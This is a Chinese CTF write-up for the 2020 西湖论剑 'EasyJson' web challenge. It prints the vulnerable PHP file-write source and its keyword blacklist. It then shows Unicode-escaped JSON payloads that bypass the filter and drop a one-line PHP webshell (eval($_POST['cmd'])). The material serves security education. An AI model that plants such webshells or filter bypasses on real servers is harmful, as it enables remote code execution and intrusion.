{"title":"西湖论剑之easyjson","uid":"b6ef90df0d5401009a96a4d7a8cf8b92","slug":"西湖论剑之easyjson","date":"2020-10-09T11:41:27.000Z","updated":"2020-10-09T11:49:32.000Z","comments":true,"path":"api/articles/西湖论剑之easyjson.json","keywords":"A1andNS","cover":[],"content":"<h2 id=\"西湖论剑2020-EasyJson\"><a href=\"#西湖论剑2020-EasyJson\" class=\"headerlink\" title=\"[西湖论剑2020] EasyJson\"></a>[西湖论剑2020] EasyJson</h2><p>考点：代码审计</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'security.php'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$sandbox</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'sandbox/'</span><span class=\"token operator\">.</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;?php echo 'Welcome To Dbapp OSS.';?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$action</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$action</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"write\"</span> <span class=\"token operator\">&amp;&amp;</span>  <span class=\"token function\">SecurityCheck</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">SecurityCheck</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//action要是write，但是还要满足securitycheck对filename和content的检查</span>\n    <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">json_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$filecontent</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$content</span><span class=\"token operator\">-></span><span class=\"token property\">content</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$sandbox</span><span class=\"token operator\">.</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filecontent</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n Powered By Dbapp OSS.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$action</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"reset\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//重置删除index.php之外的文件</span>\n    <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$files</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span> <span class=\"token operator\">!==</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token operator\">.</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Security Check Failed.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>问题是security_check()是什么东西，但是我也读不到security.php文件。</p>\n<p>看几个关键点，一个是sanbox命名规则：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$sandbox = 'sandbox/'.sha1($_SERVER['HTTP_X_FORWARDED_FOR']).'/';\nif(!file_exists($sandbox))&#123;\n    mkdir($sandbox);\n    file_put_contents($sandbox.\"index.php\",\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Welcome To Dbapp OSS.'</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\");\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里是利用你的ip做一个sha1然后得到类似sandbox/xxxxxx/，并且会做初始化，创建index.php，写一个欢迎，这里sanbox一开始不会显示，后来主办方调整了一下。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$action</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这里我们的action是要设置为write，这个后面的if里可以看出来，然后就是file_get_contents()这个点了，里面直接就是php伪协议输入流，所以我们可以post数据进去，然后这个数据会赋给content变量。安全校验函数不知道是什么，先看看如果满足if可以干什么。有两个细节，json_decode()，所以我们传入的数据应该是一个json的。另一个细节在<code>$filecontent = $content-&gt;content;</code>，这里看来传入的json应该是个json对象，conten属性就是才是内容，而它会被写入filename。那么开干：</p>\n<p>先去搞个sanbox：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">string(49) &quot;sandbox&#x2F;61b05016f4bc59750b1a38363d4d9a0a51604eda&#x2F;&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后试试写点东西,这里source不设置的话，没法看回显了。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;easyjson.d5116a.challenge.gcsis.cn&#x2F;?source&#x3D;0&amp;aciton&#x3D;write&amp;filename&#x3D;f.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里有个坑点filename不能数字开头,一开始就是用1.php，搞了半天一直安全检查过不了。</p>\n<p>post数据：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123; &quot;\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074&quot;:&quot;&lt;?\\u0070\\u0068\\u0070 \\u0070\\u0068\\u0070info();?&gt;&quot; &#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>content出现就过不了，php也是一样，所以使用unicode编码来绕过。可以看到根目录是/var/www/html/,传个木马：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123; &quot;\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074&quot;:&quot;&lt;?\\u0070\\u0068\\u0070 eval($_POST[&#39;cmd&#39;]);?&gt;&quot; &#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201009194324.png\" alt=\"1\"></p>\n<p>/目录下运行readflag，拿到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201009194331.png\" alt=\"2\"></p>\n<p>看一看security.php里面到底写了什么东西：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">/**\n * Created by PhpStorm.\n * User: meizj\n * Date: 2020/2/7\n * Time: 1:31 PM\n */</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">SecurityCheck</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[^a-z\\.]/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'on'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'html'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'upload'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n","text":"[西湖论剑2020] EasyJson考点：代码审计 &lt;?php include 'security.php'; if(!isset($_GET['source']))&#123; show_source(__FILE__); die(); &#125; $sandbox ...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":15,"path":"api/tags/CTF.json"},{"name":"西湖论剑","slug":"西湖论剑","count":2,"path":"api/tags/西湖论剑.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-EasyJson\"><span class=\"toc-text\">[西湖论剑2020] EasyJson</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"PHP伪协议","uid":"c6ac16b2709d97469cc89f64776332bb","slug":"PHP伪协议","date":"2020-10-09T12:12:55.000Z","updated":"2020-10-10T09:07:50.000Z","comments":true,"path":"api/articles/PHP伪协议.json","keywords":"A1andNS","cover":[],"text":"file://协议利用条件 allow_url_fopen:off/on allow_url_include:off/on 作用使用file://协议来访问文件系统，在CTF比赛里经常用来读取文件，以此获得flag，并且不受到allow_url_fopen和allow_url_i...","link":"","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":34,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":32,"path":"api/tags/网络安全.json"},{"name":"PHP","slug":"PHP","count":8,"path":"api/tags/PHP.json"},{"name":"协议","slug":"协议","count":1,"path":"api/tags/协议.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUU刷题记录(2020-10-5-12)","uid":"e65725db6806e965008ebeaa6f55ead7","slug":"BUU刷题记录-2020-10-5-12","date":"2020-10-05T13:08:44.000Z","updated":"2021-06-28T14:57:44.243Z","comments":true,"path":"api/articles/BUU刷题记录-2020-10-5-12.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"0x01 [极客大挑战 2019]PHP考点：PHP反序列化 上来就是一只喵，提示备份文件,试一试常见的备份格式，www.zip文件下载到本地。 解压后就这几个文件，其中index.php、flag.php、class.php才是重点，看一下都写了什么东西。 index.php：...","link":"","photos":[],"count_time":{"symbolsCount":"8.1k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":15,"path":"api/tags/CTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}